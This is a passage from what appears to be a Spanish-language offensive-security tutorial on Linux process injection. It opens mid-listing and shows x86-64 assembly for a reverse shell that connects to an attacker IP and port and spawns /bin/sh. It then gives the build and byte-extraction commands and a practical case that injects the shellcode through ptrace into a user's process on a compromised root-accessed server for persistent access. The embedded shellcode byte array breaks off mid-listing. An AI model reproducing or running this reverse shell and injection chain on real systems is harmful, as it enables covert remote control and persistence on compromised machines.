</span><span id="__span-16-30"><a id="__codelineno-16-30" name="__codelineno-16-30" href="#__codelineno-16-30"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="c1">;IPV4</span>
</span><span id="__span-16-31"><a id="__codelineno-16-31" name="__codelineno-16-31" href="#__codelineno-16-31"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="c1">;TCP</span>
</span><span id="__span-16-32"><a id="__codelineno-16-32" name="__codelineno-16-32" href="#__codelineno-16-32"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w"> </span><span class="c1">; Default</span>
</span><span id="__span-16-33"><a id="__codelineno-16-33" name="__codelineno-16-33" href="#__codelineno-16-33"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-16-34"><a id="__codelineno-16-34" name="__codelineno-16-34" href="#__codelineno-16-34"></a>
</span><span id="__span-16-35"><a id="__codelineno-16-35" name="__codelineno-16-35" href="#__codelineno-16-35"></a><span class="w">    </span><span class="c1">; Store socket FD</span>
</span><span id="__span-16-36"><a id="__codelineno-16-36" name="__codelineno-16-36" href="#__codelineno-16-36"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r8</span><span class="p">,</span><span class="w"> </span><span class="nb">rax</span>
</span><span id="__span-16-37"><a id="__codelineno-16-37" name="__codelineno-16-37" href="#__codelineno-16-37"></a>
</span><span id="__span-16-38"><a id="__codelineno-16-38" name="__codelineno-16-38" href="#__codelineno-16-38"></a><span class="w">    </span><span class="c1">; CONNECT</span>
</span><span id="__span-16-39"><a id="__codelineno-16-39" name="__codelineno-16-39" href="#__codelineno-16-39"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">42</span>
</span><span id="__span-16-40"><a id="__codelineno-16-40" name="__codelineno-16-40" href="#__codelineno-16-40"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">r8</span>
</span><span id="__span-16-41"><a id="__codelineno-16-41" name="__codelineno-16-41" href="#__codelineno-16-41"></a><span class="w">                    </span><span class="c1">;   Stack        Low  &lt;----------- High</span>
</span><span id="__span-16-42"><a id="__codelineno-16-42" name="__codelineno-16-42" href="#__codelineno-16-42"></a><span class="w">    </span><span class="c1">; Entrada esperada: 02 00 11 5c C0 A8 12 8D 00 00 00 00 00 00 00 00   </span>
</span><span id="__span-16-43"><a id="__codelineno-16-43" name="__codelineno-16-43" href="#__codelineno-16-43"></a><span class="w">    </span><span class="c1">;                   └──┘  └──┘  └────────┘  └──────────────────────┘</span>
</span><span id="__span-16-44"><a id="__codelineno-16-44" name="__codelineno-16-44" href="#__codelineno-16-44"></a><span class="w">    </span><span class="c1">;                   0-1   2-3   4-7         8-15         (16 bytes en total)</span>
</span><span id="__span-16-45"><a id="__codelineno-16-45" name="__codelineno-16-45" href="#__codelineno-16-45"></a><span class="w">    </span><span class="c1">;                   fam   port  IP          padding</span>
</span><span id="__span-16-46"><a id="__codelineno-16-46" name="__codelineno-16-46" href="#__codelineno-16-46"></a>
</span><span id="__span-16-47"><a id="__codelineno-16-47" name="__codelineno-16-47" href="#__codelineno-16-47"></a><span class="w">    </span><span class="c1">; Mapeado de los campos de sockaddr_in:</span>
</span><span id="__span-16-48"><a id="__codelineno-16-48" name="__codelineno-16-48" href="#__codelineno-16-48"></a><span class="w">                        </span><span class="c1">; Bytes 0-1:   02 00           → sin_family (AF_INET = 2)</span>
</span><span id="__span-16-49"><a id="__codelineno-16-49" name="__codelineno-16-49" href="#__codelineno-16-49"></a><span class="w">                        </span><span class="c1">; Bytes 2-3:   11 5c           → sin_port (4444)</span>
</span><span id="__span-16-50"><a id="__codelineno-16-50" name="__codelineno-16-50" href="#__codelineno-16-50"></a><span class="w">                        </span><span class="c1">; Bytes 4-7:   7F 00 00 01     → sin_addr (127.0.0.1)</span>
</span><span id="__span-16-51"><a id="__codelineno-16-51" name="__codelineno-16-51" href="#__codelineno-16-51"></a><span class="w">                        </span><span class="c1">; Bytes 8-15:  00 00 00 00...  → sin_zero (padding)</span>
</span><span id="__span-16-52"><a id="__codelineno-16-52" name="__codelineno-16-52" href="#__codelineno-16-52"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r9</span><span class="p">,</span><span class="nb">r9</span><span class="w"> </span><span class="c1">; 0</span>
</span><span id="__span-16-53"><a id="__codelineno-16-53" name="__codelineno-16-53" href="#__codelineno-16-53"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="nb">r9</span><span class="w"> </span><span class="c1">; 64 bits de padding a 0 (sin_zero)(8 bytes)</span>
</span><span id="__span-16-54"><a id="__codelineno-16-54" name="__codelineno-16-54" href="#__codelineno-16-54"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0100007F5c110002</span>
</span><span id="__span-16-55"><a id="__codelineno-16-55" name="__codelineno-16-55" href="#__codelineno-16-55"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="nb">r10</span><span class="w"> </span><span class="c1">; sin_family + sin_port + sin_addr (8 bytes)</span>
</span><span id="__span-16-56"><a id="__codelineno-16-56" name="__codelineno-16-56" href="#__codelineno-16-56"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span><span class="w"> </span><span class="c1">; direccion del tope de la pila</span>
</span><span id="__span-16-57"><a id="__codelineno-16-57" name="__codelineno-16-57" href="#__codelineno-16-57"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="c1">;IPV4 (espera 16 bytes)</span>
</span><span id="__span-16-58"><a id="__codelineno-16-58" name="__codelineno-16-58" href="#__codelineno-16-58"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-16-59"><a id="__codelineno-16-59" name="__codelineno-16-59" href="#__codelineno-16-59"></a>
</span><span id="__span-16-60"><a id="__codelineno-16-60" name="__codelineno-16-60" href="#__codelineno-16-60"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="nb">rsi</span>
</span><span id="__span-16-61"><a id="__codelineno-16-61" name="__codelineno-16-61" href="#__codelineno-16-61"></a><span class="nl">.dup2:</span><span class="w">                        </span><span class="c1">; stdin(0), stdout(1), stderr(2) redirigidos al socket</span>
</span><span id="__span-16-62"><a id="__codelineno-16-62" name="__codelineno-16-62" href="#__codelineno-16-62"></a><span class="w">    </span><span class="c1">;DUP2</span>
</span><span id="__span-16-63"><a id="__codelineno-16-63" name="__codelineno-16-63" href="#__codelineno-16-63"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">33</span>
</span><span id="__span-16-64"><a id="__codelineno-16-64" name="__codelineno-16-64" href="#__codelineno-16-64"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">r8</span>
</span><span id="__span-16-65"><a id="__codelineno-16-65" name="__codelineno-16-65" href="#__codelineno-16-65"></a><span class="w">    </span><span class="nf">syscall</span><span class="w"> </span>
</span><span id="__span-16-66"><a id="__codelineno-16-66" name="__codelineno-16-66" href="#__codelineno-16-66"></a><span class="w">    </span><span class="nf">inc</span><span class="w"> </span><span class="nb">rsi</span>
</span><span id="__span-16-67"><a id="__codelineno-16-67" name="__codelineno-16-67" href="#__codelineno-16-67"></a><span class="w">    </span><span class="nf">cmp</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span>
</span><span id="__span-16-68"><a id="__codelineno-16-68" name="__codelineno-16-68" href="#__codelineno-16-68"></a><span class="w">    </span><span class="nf">jl</span><span class="w"> </span><span class="nv">.dup2</span>
</span><span id="__span-16-69"><a id="__codelineno-16-69" name="__codelineno-16-69" href="#__codelineno-16-69"></a>
</span><span id="__span-16-70"><a id="__codelineno-16-70" name="__codelineno-16-70" href="#__codelineno-16-70"></a><span class="w">    </span><span class="c1">; EXEXCVE</span>
</span><span id="__span-16-71"><a id="__codelineno-16-71" name="__codelineno-16-71" href="#__codelineno-16-71"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">59</span>
</span><span id="__span-16-72"><a id="__codelineno-16-72" name="__codelineno-16-72" href="#__codelineno-16-72"></a>
</span><span id="__span-16-73"><a id="__codelineno-16-73" name="__codelineno-16-73" href="#__codelineno-16-73"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="mi">0</span><span class="w">                       </span><span class="c1">; null terminator de /bin/sh -&gt; /bin/sh\0</span>
</span><span id="__span-16-74"><a id="__codelineno-16-74" name="__codelineno-16-74" href="#__codelineno-16-74"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r12</span><span class="p">,</span><span class="w"> </span><span class="mh">0x68732f6e69622f</span><span class="w">    </span><span class="c1">; /bin/sh (2F 62 69 6E 2F 73 68) en little-endian</span>
</span><span id="__span-16-75"><a id="__codelineno-16-75" name="__codelineno-16-75" href="#__codelineno-16-75"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="nb">r12</span><span class="w">                     </span><span class="c1">; string /bin/sh</span>
</span><span id="__span-16-76"><a id="__codelineno-16-76" name="__codelineno-16-76" href="#__codelineno-16-76"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span>
</span><span id="__span-16-77"><a id="__codelineno-16-77" name="__codelineno-16-77" href="#__codelineno-16-77"></a>
</span><span id="__span-16-78"><a id="__codelineno-16-78" name="__codelineno-16-78" href="#__codelineno-16-78"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="mi">0</span><span class="w">                       </span><span class="c1">; argv = {NULL}</span>
</span><span id="__span-16-79"><a id="__codelineno-16-79" name="__codelineno-16-79" href="#__codelineno-16-79"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span>
</span><span id="__span-16-80"><a id="__codelineno-16-80" name="__codelineno-16-80" href="#__codelineno-16-80"></a>
</span><span id="__span-16-81"><a id="__codelineno-16-81" name="__codelineno-16-81" href="#__codelineno-16-81"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="mi">0</span><span class="w">                       </span><span class="c1">; envp = {NULL}</span>
</span><span id="__span-16-82"><a id="__codelineno-16-82" name="__codelineno-16-82" href="#__codelineno-16-82"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span>
</span><span id="__span-16-83"><a id="__codelineno-16-83" name="__codelineno-16-83" href="#__codelineno-16-83"></a>
</span><span id="__span-16-84"><a id="__codelineno-16-84" name="__codelineno-16-84" href="#__codelineno-16-84"></a><span class="w">    </span><span class="nf">syscall</span><span class="w"> </span>
</span><span id="__span-16-85"><a id="__codelineno-16-85" name="__codelineno-16-85" href="#__codelineno-16-85"></a>
</span><span id="__span-16-86"><a id="__codelineno-16-86" name="__codelineno-16-86" href="#__codelineno-16-86"></a><span class="nl">.done:</span>
</span><span id="__span-16-87"><a id="__codelineno-16-87" name="__codelineno-16-87" href="#__codelineno-16-87"></a><span class="w">    </span><span class="c1">; EXIT</span>
</span><span id="__span-16-88"><a id="__codelineno-16-88" name="__codelineno-16-88" href="#__codelineno-16-88"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">60</span><span class="w">                    </span><span class="c1">; syscall: exit</span>
</span><span id="__span-16-89"><a id="__codelineno-16-89" name="__codelineno-16-89" href="#__codelineno-16-89"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">rdi</span><span class="w">                   </span><span class="c1">; exit code = 0 (éxito)</span>
</span><span id="__span-16-90"><a id="__codelineno-16-90" name="__codelineno-16-90" href="#__codelineno-16-90"></a><span class="w">    </span><span class="nf">syscall</span>
</span></code></pre></div>
<h2 id="compilacion">Compilación<a class="headerlink" href="#compilacion" title="Permanent link">&para;</a></h2>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c1"># Compilar el shellcode de reverse shell</span>
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>nasm<span class="w"> </span>-f<span class="w"> </span>elf64<span class="w"> </span>proc_inj_rev_tcp.asm<span class="w"> </span>-o<span class="w"> </span>proc_inj_rev_tcp.o
</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>ld<span class="w"> </span>proc_inj_rev_tcp.o<span class="w"> </span>-o<span class="w"> </span>proc_inj_rev_tcp
</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>
</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="c1"># Extraer bytes del shellcode (para actualizar la sección .data del inyector)</span>
</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>objcopy<span class="w"> </span>-O<span class="w"> </span>binary<span class="w"> </span>--only-section<span class="o">=</span>.text<span class="w"> </span>proc_inj_rev_tcp<span class="w"> </span>proc_inj_rev_tcp.bin
</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>xxd<span class="w"> </span>-i<span class="w"> </span>proc_inj_rev_tcp.bin
</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>
</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a><span class="c1"># Compilar el inyector</span>
</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a>nasm<span class="w"> </span>-f<span class="w"> </span>elf64<span class="w"> </span>proc_inj.asm<span class="w"> </span>-o<span class="w"> </span>proc_inj.o
</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>ld<span class="w"> </span>proc_inj.o<span class="w"> </span>-o<span class="w"> </span>proc_inj
</span></code></pre></div>
<h2 id="caso-practico">Caso Práctico<a class="headerlink" href="#caso-practico" title="Permanent link">&para;</a></h2>
<p>Se ha comprometido un servidor Linux y se tiene acceso como <em>root</em>. El objetivo es inyectar una reverse shell en un proceso de larga duración de un usuario del sistema para mantener acceso persistente. Al ser <em>root</em> no hay restricciones de <code>ptrace_scope</code>, <em>root</em> puede trazar cualquier proceso del sistema independientemente de su configuración.</p>
<p>En primer lugar, comenzamos editando el script <code>proc_inj_rev_tcp.asm</code>, ya que las modificaciones son datos propios del atacante. Para ello, debemos obtener la dirección IP de la máquina atacante y definir un puerto de escucha.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1"># Máquina atacante</span>
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>ip<span class="w"> </span>a
</span></code></pre></div>
<p><img alt="image.png" src="../RAZOR/image.png" /></p>
<p>La IP del atacante es la <strong>192.168.18.245</strong>, que en hexadecimal equivale a <code>0xC0A812F5</code>. El puerto de escucha que utilizaremos será el <strong>443</strong>, equivalente a <code>0x1BB</code>.</p>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1">; CONNECT</span>
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">42</span>
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">r8</span>
</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>
</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="c1">;   Stack        Low  &lt;----------- High</span>
</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="c1">; Entrada esperada (16 bytes):</span>
</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a><span class="c1">; 02 00 01 BB C0 A8 12 F5 00 00 00 00 00 00 00 00</span>
</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a><span class="c1">; └──┘ └──┘ └────────┘ └────────────────────────┘</span>
</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a><span class="c1">; fam  port      IP              padding</span>
</span><span id="__span-19-10"><a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a>
</span><span id="__span-19-11"><a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a><span class="c1">; Mapeo sockaddr_in:</span>
</span><span id="__span-19-12"><a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a><span class="c1">; Bytes 0-1:  02 00         -&gt; sin_family (AF_INET = 2)</span>
</span><span id="__span-19-13"><a id="__codelineno-19-13" name="__codelineno-19-13" href="#__codelineno-19-13"></a><span class="c1">; Bytes 2-3:  01 BB         -&gt; sin_port   (443, big-endian)</span>
</span><span id="__span-19-14"><a id="__codelineno-19-14" name="__codelineno-19-14" href="#__codelineno-19-14"></a><span class="c1">; Bytes 4-7:  C0 A8 12 F5   -&gt; sin_addr   (192.168.18.245)</span>
</span><span id="__span-19-15"><a id="__codelineno-19-15" name="__codelineno-19-15" href="#__codelineno-19-15"></a><span class="c1">; Bytes 8-15: 00 ... 00     -&gt; sin_zero   (padding)</span>
</span><span id="__span-19-16"><a id="__codelineno-19-16" name="__codelineno-19-16" href="#__codelineno-19-16"></a>
</span><span id="__span-19-17"><a id="__codelineno-19-17" name="__codelineno-19-17" href="#__codelineno-19-17"></a><span class="nf">xor</span><span class="w"> </span><span class="nb">r9</span><span class="p">,</span><span class="w"> </span><span class="nb">r9</span>
</span><span id="__span-19-18"><a id="__codelineno-19-18" name="__codelineno-19-18" href="#__codelineno-19-18"></a><span class="nf">push</span><span class="w"> </span><span class="nb">r9</span><span class="w">                         </span><span class="c1">; 8 bytes a 0 (sin_zero)</span>
</span><span id="__span-19-19"><a id="__codelineno-19-19" name="__codelineno-19-19" href="#__codelineno-19-19"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="mh">0xF512A8C0BB010002</span><span class="w">      </span><span class="c1">; [02 00][01 BB][C0 A8 12 F5]</span>
</span><span id="__span-19-20"><a id="__codelineno-19-20" name="__codelineno-19-20" href="#__codelineno-19-20"></a><span class="nf">push</span><span class="w"> </span><span class="nb">r10</span><span class="w">                         </span><span class="c1">; fam+port+ip</span>
</span><span id="__span-19-21"><a id="__codelineno-19-21" name="__codelineno-19-21" href="#__codelineno-19-21"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span><span class="w">                     </span><span class="c1">; sockaddr_in*</span>
</span><span id="__span-19-22"><a id="__codelineno-19-22" name="__codelineno-19-22" href="#__codelineno-19-22"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="w">                      </span><span class="c1">; sizeof(sockaddr_in)</span>
</span><span id="__span-19-23"><a id="__codelineno-19-23" name="__codelineno-19-23" href="#__codelineno-19-23"></a><span class="nf">syscall</span>
</span></code></pre></div>
<p>Compilamos el script y obtenemos los bytes que formarán el shellcode a inyectar.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c1"># Compilar el shellcode de reverse shell</span>
</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>nasm<span class="w"> </span>-f<span class="w"> </span>elf64<span class="w"> </span>proc_inj_rev_tcp.asm<span class="w"> </span>-o<span class="w"> </span>proc_inj_rev_tcp.o
</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>ld<span class="w"> </span>proc_inj_rev_tcp.o<span class="w"> </span>-o<span class="w"> </span>proc_inj_rev_tcp
</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>
</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="c1"># Extraer bytes del shellcode (para actualizar la sección .data del inyector)</span>
</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>objcopy<span class="w"> </span>-O<span class="w"> </span>binary<span class="w"> </span>--only-section<span class="o">=</span>.text<span class="w"> </span>proc_inj_rev_tcp<span class="w"> </span>proc_inj_rev_tcp.bin
</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a>xxd<span class="w"> </span>-i<span class="w"> </span>proc_inj_rev_tcp.bin
</span></code></pre></div>
<p><img alt="image.png" src="../RAZOR/image_1.png" /></p>
<p>El shellcode tiene un tamaño de 161 bytes. Dado que <code>PTRACE_POKEDATA</code> escribe exactamente 8 bytes por llamada, el tamaño total del shellcode debe ser múltiplo de 8. El siguiente múltiplo de 8 después de 161 es 168, por lo que se añaden 7 bytes NOP (<code>0x90</code>) como padding al final para completar los 168 bytes (168 / 8 = 21 escrituras).</p>
<p>Una vez obtenidos los bytes que conforman el shellcode, podemos añadir el bloque al script inyector <code>proc_inj.asm</code>.</p>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c1">; proc_inj.asm</span>
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>
</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="nl">shellcode:</span>
</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0xb8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x39</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span>
</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x83</span><span class="p">,</span><span class="w"> </span><span class="mh">0xf8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x74</span><span class="p">,</span><span class="w"> </span><span class="mh">0x11</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8d</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1d</span>
</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0xec</span><span class="p">,</span><span class="w"> </span><span class="mh">0xff</span><span class="p">,</span><span class="w"> </span><span class="mh">0xff</span><span class="p">,</span><span class="w"> </span><span class="mh">0xff</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4d</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8b</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb3</span><span class="p">,</span><span class="w"> </span><span class="mh">0xf8</span>
</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x0f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x41</span><span class="p">,</span><span class="w"> </span><span class="mh">0xff</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe6</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x70</span>
</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x29</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span>
</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0xbf</span><span class="p">,</span><span class="w"> </span><span class="mh">0x02</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0xbe</span>
</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x01</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="mh">0x31</span><span class="p">,</span><span class="w"> </span><span class="mh">0xd2</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0f</span>
</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w"> </span><span class="mh">0x49</span><span class="p">,</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc0</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2a</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span>
</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc7</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4d</span><span class="p">,</span><span class="w"> </span><span class="mh">0x31</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc9</span><span class="p">,</span><span class="w"> </span><span class="mh">0x41</span>
</span><span id="__span-21-13"><a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x51</span><span class="p">,</span><span class="w"> </span><span class="mh">0x49</span><span class="p">,</span><span class="w"> </span><span class="mh">0xba</span><span class="p">,</span><span class="w"> </span><span class="mh">0x02</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x01</span><span class="p">,</span><span class="w"> </span><span class="mh">0xbb</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc0</span>
